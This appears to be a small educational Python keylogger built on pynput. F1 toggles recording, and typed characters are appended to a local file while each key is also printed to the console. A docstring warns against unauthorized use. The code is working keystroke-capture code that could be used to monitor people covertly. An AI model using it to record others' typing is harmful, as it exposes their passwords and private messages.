"""
Abdul Jalal Raoufi
This keylogger demonstrates:
keyboard event capture, log management

Unauthorized use of keyloggers is illegal.
Only use on systems you own or have permission to monitor
"""

from pynput import keyboard
from pynput.keyboard import Key


class keylogger:
    def __init__(self):
        self.recording=False
        self.toggle_key=Key.f1
        self.keyFile="keyfile.txt"

    def toggle(self) -> bool:
            self.recording= not self.recording
            return self.recording
    

    def keyPressed(self, key):
    
        if key == self.toggle_key:
            state=self.toggle()
            print(f"keyboard recording {'ON' if state else 'OFF'}")
            return
        
        if not self.recording:
            return


        print(str(key))
        with open(self.keyFile, 'a') as logKey:
            try:
                char=key.char
                logKey.write(char)
            except:
                print("Error getting char")

if __name__ == "__main__":
        logger= keylogger()
        listener = keyboard.Listener(on_press=logger.keyPressed)
        listener.start()
        input()